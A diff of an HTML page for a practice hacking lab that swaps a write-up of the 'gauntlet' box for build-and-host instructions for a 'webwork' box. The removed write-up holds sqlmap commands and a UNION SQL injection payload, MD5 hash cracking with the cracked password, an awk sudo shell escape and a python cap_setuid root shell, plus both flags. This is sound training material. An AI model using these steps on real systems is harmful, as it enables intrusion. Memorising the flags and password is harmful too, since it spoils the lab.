@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>gauntlet – Write-up</title>
+<title>webwork – Instructions</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@600;700;800&family=Figtree:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -50,27 +50,19 @@ header p b{color:#90e0ef}
 .bar button{font:inherit;font-weight:600;font-size:.88rem;padding:6px 12px;border-radius:10px;border:1px solid var(--line);background:transparent;color:var(--ink);cursor:pointer}
 .bar button:hover{border-color:var(--accent);color:var(--accent)}
 .bar button:focus-visible{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent2) 45%,transparent)}
-.intro{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:18px 20px;margin:0 0 20px;box-shadow:var(--shadow)}
-.intro p{margin:.35rem 0}
 section.step{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:20px 20px 18px;margin:0 0 20px;box-shadow:var(--shadow)}
 section.step h2{font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.25rem;font-weight:700;margin:0 0 10px;display:flex;align-items:center;gap:12px;letter-spacing:-.01em}
 .num{flex:none;display:inline-grid;place-items:center;width:36px;height:36px;border-radius:12px;font-size:1rem;font-weight:800;color:#fff;background:linear-gradient(135deg,#2d6a4f,#0096c7)}
 section.step p{margin:10px 0}
-pre{position:relative;background:var(--code);color:var(--codeink);padding:14px 46px 14px 16px;border-radius:14px;overflow-x:auto;margin:12px 0;font:13.5px/1.55 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid #00b4d8}
+ul{margin:10px 0;padding-left:1.3em}
+li{margin:6px 0}
+pre{position:relative;background:var(--code);color:var(--codeink);padding:12px 14px;border-radius:14px;overflow-x:auto;margin:12px 0;font:13.5px/1.7 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid #00b4d8}
 pre code{background:none;padding:0;color:inherit;white-space:pre}
 code{font:0.9em ui-monospace,Menlo,Consolas,monospace;background:var(--why);padding:1px 6px;border-radius:6px;color:var(--ink)}
 .copy{position:absolute;top:8px;right:8px;font:inherit;font-size:.72rem;font-weight:600;cursor:pointer;border:1px solid var(--line);border-radius:8px;padding:3px 8px;background:var(--card);color:var(--muted)}
 .copy.done{color:var(--okline);border-color:var(--okline)}
-.why{margin-top:16px;background:var(--why);border:1px solid color-mix(in srgb,var(--whyline) 35%,transparent);border-left:5px solid var(--whyline);padding:12px 16px;border-radius:14px}
-.why h3{margin:0 0 6px;font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.02rem}
-.why ol{margin:6px 0;padding-left:1.3em}
-.why li{margin:6px 0}
-.flag{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:12px 0;padding:11px 14px;border-radius:12px;border:1px solid var(--okline);background:var(--okbg)}
-.flag .lbl{font-weight:800;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--okline)}
-.flag code{background:var(--card);border:1px solid var(--line);color:var(--ink);padding:.15em .5em;border-radius:7px;font-weight:600}
-.flag .fcopy{margin-left:auto;font:inherit;font-size:.72rem;font-weight:600;cursor:pointer;border:1px solid var(--okline);border-radius:8px;padding:2px 9px;background:transparent;color:var(--okline)}
-.flag .fcopy.done{background:var(--okbg)}
-.lesson{margin-top:6px;color:var(--muted)}
+.note{margin-top:14px;background:var(--why);border:1px solid color-mix(in srgb,var(--whyline) 35%,transparent);border-left:5px solid var(--whyline);padding:12px 16px;border-radius:14px}
+.note h3{margin:0 0 6px;font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.02rem}
 .sig{margin:30px 0 0;text-align:center;font-size:.85rem;color:var(--muted)}
 .sig a{color:var(--accent);text-decoration:none;font-weight:700}
 .sig a:hover{text-decoration:underline}
@@ -90,113 +82,103 @@ code{font:0.9em ui-monospace,Menlo,Consolas,monospace;background:var(--why);padd
   .metarow b{color:var(--muted);font-weight:600}
   .tag{display:inline-block;font-size:.72rem;font-weight:600;padding:2px 8px;border-radius:99px;background:var(--bg2);border:1px solid var(--line);color:var(--muted);margin:6px 4px 0 0}
 }
+.ipv{color:var(--accent2);font-weight:700}
+.ipv.set{color:#52b788}
+.ipbox{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:0 -8px 18px;padding:12px 14px;border-radius:14px;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow)}
+.ipbox label{font-weight:700;font-size:.9rem;color:var(--muted);white-space:nowrap}
+.ipbox input{font:inherit;font-size:.95rem;color:var(--ink);background:var(--bg);border:1.5px solid var(--line);border-radius:10px;padding:8px 12px;flex:1;min-width:min(200px,100%)}
+.ipbox input:focus-visible{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent2) 45%,transparent)}
+.ipbox .hint{font-size:.78rem;color:var(--muted)}
+pre code .cl{display:flex;align-items:center;gap:10px}
+pre code .cl .t{white-space:pre;flex:1;min-width:0;overflow-x:auto}
+pre code .cl .lc{flex:none;font:inherit;font-size:.66rem;font-weight:600;cursor:pointer;border:1px solid var(--line);border-radius:6px;padding:1px 7px;background:var(--card);color:var(--muted);opacity:.5;transition:opacity .15s}
+pre code .cl:hover .lc{opacity:1}
+pre code .cl .lc:focus-visible{opacity:1;outline:none;border-color:var(--accent)}
+pre code .cl .lc.done{color:var(--okline);border-color:var(--okline);opacity:1}
 .skip{position:absolute;left:-999px}
 .skip:focus{left:14px;top:14px;z-index:40;background:var(--card);color:var(--ink);padding:8px 12px;border-radius:10px;border:1px solid var(--line)}
 </style>
 </head>
 <body id="top">
-<a href="#s1" class="skip">Skip to walkthrough</a>
+<a href="#s1" class="skip">Skip to setup</a>
 
-<nav class="side" aria-label="Steps">
-  <h2>Steps</h2>
+<nav class="side" aria-label="Sections">
+  <h2>Sections</h2>
   <div class="chips" id="chips"></div>
-  <p class="now" id="now">1 · Enumerate</p>
+  <p class="now" id="now">1 · What this box is</p>
   <div class="metacard">
-    <div class="metarow"><b>Level</b><span>Medium</span></div>
+    <div class="metarow"><b>Level</b><span>Easy–Medium</span></div>
+    <div class="metarow"><b>OS</b><span>Debian 12</span></div>
     <div class="metarow"><b>Flags</b><span>user + root</span></div>
-    <div class="metarow"><b>Services</b><span>SSH · HTTP</span></div>
-    <div><span class="tag">SQLi</span><span class="tag">cracking</span><span class="tag">sudo</span><span class="tag">capabilities</span></div>
+    <div><span class="tag">web</span><span class="tag">SQLi</span><span class="tag">privesc</span></div>
   </div>
 </nav>
 
 <main>
 <header>
-  <p class="eyebrow">Practice Lab · Write-up</p>
-  <h1>gauntlet</h1>
-  <p>Medium Linux box: <b>SQL injection</b> &rarr; dump &amp; crack hashes &rarr; SSH &rarr; a two-step privilege escalation (<code>sudo -u</code> pivot, then a Linux capability). Commands use <span class="ph">&lt;target-ip&gt;</span>.</p>
+  <p class="eyebrow">Practice Lab · Instructions</p>
+  <h1>webwork</h1>
+  <p>How to build, run, and host this box. No solutions here — the full walkthrough is in <code>writeup.html</code>.</p>
 </header>
 
 <div class="bar">
-  <span class="score" id="score">Step 1 / 6</span>
+  <span class="score" id="score">Section 1 / 5</span>
   <button id="themeBtn" type="button">Theme</button>
   <button id="topBtn" type="button">Top</button>
   <div class="track"><div class="fill" id="fill"></div></div>
 </div>
 
-<div class="intro">
-  <p><b>Goal.</b> Capture the <b>user</b> and <b>root</b> flags. Root is a chain: you first pivot to a service account, then abuse a file capability.</p>
-  <p><b>Scope.</b> Only attack the IP you were given. Replace <span class="ph">&lt;target-ip&gt;</span> everywhere.</p>
+<div class="ipbox">
+  <label for="ipv">Target IP</label>
+  <input id="ipv" type="text" placeholder="e.g. 192.168.56.101" autocomplete="off" spellcheck="false">
+  <span class="hint">set once — it fills into every command below</span>
 </div>
 
 <div id="doc">
 
-  <section class="step" id="s1" data-title="Enumerate">
-    <h2><span class="num">1</span>Enumerate</h2>
-    <pre><code>nmap -sC -sV <span class="ph">&lt;target-ip&gt;</span>
-#   22/tcp ssh ; 80/tcp http (DevHub)</code></pre>
-    <p>The site is a product catalogue with a search box that hits <code>search.php?q=</code>.</p>
-    <div class="why"><h3>Why it works</h3><ol><li>User-controlled query parameters that feed a database are the first place to test for injection.</li></ol></div>
+  <section class="step" id="s1" data-title="What this box is">
+    <h2><span class="num">1</span>What this box is</h2>
+    <p><b>webwork</b> is the easy–medium machine in the set — a Debian VM running a small PHP web app (Apache + MariaDB). The path is a classic web chain into a shell, then a privilege-escalation via a scheduled job.</p>
+    <p>Self-contained and offline once built. Runs on a laptop or a headless server VM.</p>
   </section>
 
-  <section class="step" id="s2" data-title="SQL injection">
-    <h2><span class="num">2</span>SQL injection</h2>
-    <p>The <code>q</code> parameter is injectable. Let sqlmap dump the users table:</p>
-    <pre><code>sqlmap -u "http://<span class="ph">&lt;target-ip&gt;</span>/search.php?q=test" -p q --batch --dbs
-sqlmap -u "http://<span class="ph">&lt;target-ip&gt;</span>/search.php?q=test" -p q --batch -D devhub -T users --dump</code></pre>
-    <p>A manual UNION works too:</p>
-    <pre><code>q=%' UNION SELECT 1,username,password FROM users -- -</code></pre>
-    <p>You recover MD5 password hashes, including <code>mbrown</code>.</p>
-    <div class="why"><h3>Why it works</h3><ol><li>The query is <code>... WHERE title LIKE '%$q%'</code> with no parameterization, so you can break out and add a <code>UNION SELECT</code> that returns rows from <code>users</code>.</li></ol></div>
+  <section class="step" id="s2" data-title="Requirements">
+    <h2><span class="num">2</span>Requirements</h2>
+    <pre><code># Debian / Ubuntu / Kali
+sudo apt update &amp;&amp; sudo apt install -y virtualbox vagrant</code></pre>
+    <p>About 1&nbsp;GB RAM and ~5&nbsp;GB disk while building. The Debian base box downloads once and is reused across all boxes.</p>
   </section>
 
-  <section class="step" id="s3" data-title="Crack the hash">
-    <h2><span class="num">3</span>Crack the hash</h2>
-    <pre><code># rockyou: gunzip -k /usr/share/wordlists/rockyou.txt.gz
-hashcat -m 0 mbrown.hash /usr/share/wordlists/rockyou.txt
-# or
-john --format=raw-md5 --wordlist=rockyou.txt mbrown.hash
-#   mbrown : chocolate</code></pre>
-    <div class="why"><h3>Why it works</h3><ol><li>Unsalted MD5 is fast to crack, and a dictionary word falls instantly to a wordlist like rockyou.</li></ol></div>
+  <section class="step" id="s3" data-title="Build the box">
+    <h2><span class="num">3</span>Build the box</h2>
+    <pre><code>cd m2-webwork
+vagrant up</code></pre>
+    <p>Export a portable <span class="ph">.ova</span> with the build script from the repo root:</p>
+    <pre><code>./build-all.sh m2-webwork      # -&gt; m2-webwork/lab-m2-webwork.ova</code></pre>
+    <div class="note"><h3>Note</h3>The build disables the Vagrant provisioning account before export, so there is no build-time backdoor.</div>
   </section>
 
-  <section class="step" id="s4" data-title="Access → user">
-    <h2><span class="num">4</span>Access → user</h2>
-    <pre><code>ssh mbrown@<span class="ph">&lt;target-ip&gt;</span>     # chocolate
-cat /home/mbrown/user.txt</code></pre>
-    <div class="flag"><span class="lbl">user flag</span><code>FLAG{sqli_dump_crack_login}</code></div>
-    <div class="why"><h3>Why it works</h3><ol><li>The cracked application password is reused as the user's system password, so it grants SSH access.</li></ol></div>
+  <section class="step" id="s4" data-title="Run it &amp; get the IP">
+    <h2><span class="num">4</span>Run it &amp; get the IP</h2>
+    <p>Import the <code>.ova</code>, set the adapter to a <b>Host-only</b> network (never expose it to the internet), and boot. Find the IP from the host:</p>
+    <pre><code>sudo nmap -sn 192.168.56.0/24</code></pre>
+    <p>That address is the challenger's <span class="ph ipv">&lt;target-ip&gt;</span>.</p>
+    <div class="note"><h3>Headless / server</h3><code>VBoxManage startvm "lab-m2-webwork" --type headless</code></div>
   </section>
 
-  <section class="step" id="s5" data-title="Pivot mbrown → svc">
-    <h2><span class="num">5</span>Escalate, step 1: pivot to svc</h2>
-    <pre><code>sudo -l
-#   (svc) NOPASSWD: /usr/bin/awk
-sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'
-# whoami -> svc</code></pre>
-    <div class="why"><h3>Why it works</h3><ol><li>mbrown may run <code>awk</code> as the <code>svc</code> user without a password.</li><li><code>awk</code>'s <code>system()</code> spawns a shell (GTFOBins), so you become <code>svc</code>.</li></ol></div>
-  </section>
-
-  <section class="step" id="s6" data-title="svc → root">
-    <h2><span class="num">6</span>Escalate, step 2: svc → root</h2>
-    <pre><code>getcap -r / 2>/dev/null
-#   /usr/local/bin/python3cap cap_setuid=ep
-/usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
-# id -> uid=0(root)
-cat /root/root.txt</code></pre>
-    <div class="flag"><span class="lbl">root flag</span><code>FLAG{c4p_s3tu1d_pyth0n_r00t}</code></div>
-    <div class="why"><h3>Why it works</h3><ol><li>A copy of Python carries the <code>cap_setuid</code> file capability, so it may change its UID to 0 without being SUID-root.</li><li><code>os.setuid(0)</code> then <code>os.system("/bin/bash")</code> gives a root shell.</li></ol></div>
-  </section>
-
-  <section class="step" id="s7" data-title="Both flags">
-    <h2><span class="num">✓</span>Both flags</h2>
-    <div class="flag"><span class="lbl">user</span><code>FLAG{sqli_dump_crack_login}</code></div>
-    <div class="flag"><span class="lbl">root</span><code>FLAG{c4p_s3tu1d_pyth0n_r00t}</code></div>
-    <p class="lesson"><b>Lesson.</b> Parameterize every query, store passwords salted and slow (never plain MD5), scope <code>sudo</code> rules tightly, and audit file capabilities — <code>cap_setuid</code> on an interpreter is as good as SUID root.</p>
+  <section class="step" id="s5" data-title="Run an assessment">
+    <h2><span class="num">5</span>Run an assessment</h2>
+    <p>Give the player the <span class="ph ipv">&lt;target-ip&gt;</span> and the challenger brief — <code>challenger_instructions.html</code> — which has the scenario, objective, rules, and a built-in flag checker. The solution is <code>writeup.html</code> (spoilers).</p>
+    <p><b>Reset between players</b> with a snapshot:</p>
+    <pre><code>VBoxManage snapshot "lab-m2-webwork" take clean
+VBoxManage controlvm "lab-m2-webwork" poweroff
+VBoxManage snapshot "lab-m2-webwork" restore clean</code></pre>
+    <div class="note"><h3>Document set for this box</h3><p><code>instructions.html</code> (host) · <code>challenger_instructions.html</code> (player) · <code>writeup.html</code> (solution)</p></div>
   </section>
 
 </div>
 
-<footer class="sig">Practice lab write-up by <a href="https://github.com/devlazybrain" target="_blank" rel="noopener">devlazybrain</a></footer>
+<footer class="sig">Practice lab by <a href="https://github.com/devlazybrain" target="_blank" rel="noopener">devlazybrain</a></footer>
 </main>
 
 <script>
@@ -205,13 +187,12 @@ cat /root/root.txt</code></pre>
   var root=document.documentElement;
   document.getElementById("themeBtn").addEventListener("click",function(){var s=root.getAttribute("data-theme");var cur=s?s:(matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light");root.setAttribute("data-theme",cur==="dark"?"light":"dark");});
   document.getElementById("topBtn").addEventListener("click",function(){window.scrollTo({top:0,behavior:(matchMedia("(prefers-reduced-motion:reduce)").matches?"auto":"smooth")});});
-  document.querySelectorAll("pre").forEach(function(pre){var b=document.createElement("button");b.className="copy";b.type="button";b.textContent="copy";b.addEventListener("click",function(){var t=pre.querySelector("code").innerText;if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){b.textContent="copied";b.classList.add("done");setTimeout(function(){b.textContent="copy";b.classList.remove("done");},1400);});});pre.appendChild(b);});
-  document.querySelectorAll(".flag").forEach(function(fl){var c=fl.querySelector("code");if(!c)return;var b=document.createElement("button");b.className="fcopy";b.type="button";b.textContent="copy";b.addEventListener("click",function(){if(navigator.clipboard)navigator.clipboard.writeText(c.innerText).then(function(){b.textContent="copied";b.classList.add("done");setTimeout(function(){b.textContent="copy";b.classList.remove("done");},1400);});});fl.appendChild(b);});
+  var IPLABEL="<target-ip>";var ipInput=document.getElementById("ipv");function ipVal(){var v=ipInput&&ipInput.value.trim();return v||IPLABEL;}function subIP(s){return s.split(IPLABEL).join(ipVal());}var proseIp=[].slice.call(document.querySelectorAll(".ipv")).filter(function(e){return !e.closest("pre");});function copyText(text,btn){if(navigator.clipboard)navigator.clipboard.writeText(text).then(function(){var o=btn.textContent;btn.textContent="copied";btn.classList.add("done");setTimeout(function(){btn.textContent=o;btn.classList.remove("done");},1200);});}var NL=String.fromCharCode(10);var codeBlocks=[];document.querySelectorAll("pre").forEach(function(pre){var code=pre.querySelector("code");if(!code)return;var lines=code.innerText.split(NL);while(lines.length&&lines[lines.length-1].trim()==="")lines.pop();code.textContent="";var rows=lines.map(function(ln){var row=document.createElement("span");row.className="cl";var t=document.createElement("span");t.className="t";row.appendChild(t);if(ln.trim()!==""&&ln.trim().charAt(0)!=="#"){var lc=document.createElement("button");lc.className="lc";lc.type="button";lc.textContent="copy";lc.setAttribute("aria-label","Copy this command");(function(line){lc.addEventListener("click",function(){copyText(subIP(line),lc);});})(ln);row.appendChild(lc);}code.appendChild(row);code.appendChild(document.createTextNode(NL));return {raw:ln,t:t};});codeBlocks.push(rows);});function renderIP(){var v=ipVal();proseIp.forEach(function(s){s.textContent=v;s.classList.toggle("set",v!==IPLABEL);});codeBlocks.forEach(function(rows){rows.forEach(function(r){r.t.textContent=subIP(r.raw);});});}if(ipInput)ipInput.addEventListener("input",renderIP);renderIP();
   var steps=[].slice.call(document.querySelectorAll("section.step"));
   var chips=document.getElementById("chips"),now=document.getElementById("now"),score=document.getElementById("score"),fill=document.getElementById("fill");
-  steps.forEach(function(s,i){var a=document.createElement("a");a.href="#"+s.id;a.textContent=(i+1<steps.length)?(i+1):"✓";a.setAttribute("aria-label","Step "+(i+1)+": "+s.dataset.title);chips.appendChild(a);});
+  steps.forEach(function(s,i){var a=document.createElement("a");a.href="#"+s.id;a.textContent=(i+1);a.setAttribute("aria-label","Section "+(i+1)+": "+s.dataset.title);chips.appendChild(a);});
   var links=[].slice.call(chips.children);
-  function setActive(i){links.forEach(function(a,j){a.classList.toggle("here",j===i);});now.textContent=(i+1)+" · "+steps[i].dataset.title;score.textContent=(i+1<steps.length)?("Step "+(i+1)+" / "+(steps.length-1)):"Complete";fill.style.width=(((i+1)/steps.length)*100)+"%";}
+  function setActive(i){links.forEach(function(a,j){a.classList.toggle("here",j===i);});now.textContent=(i+1)+" · "+steps[i].dataset.title;score.textContent="Section "+(i+1)+" / "+steps.length;fill.style.width=(((i+1)/steps.length)*100)+"%";}
   setActive(0);
   if("IntersectionObserver" in window){var io=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting){var i=steps.indexOf(x.target);if(i>=0)setActive(i);}});},{rootMargin:"-45% 0px -50% 0px",threshold:0});steps.forEach(function(s){io.observe(s);});}
 })();
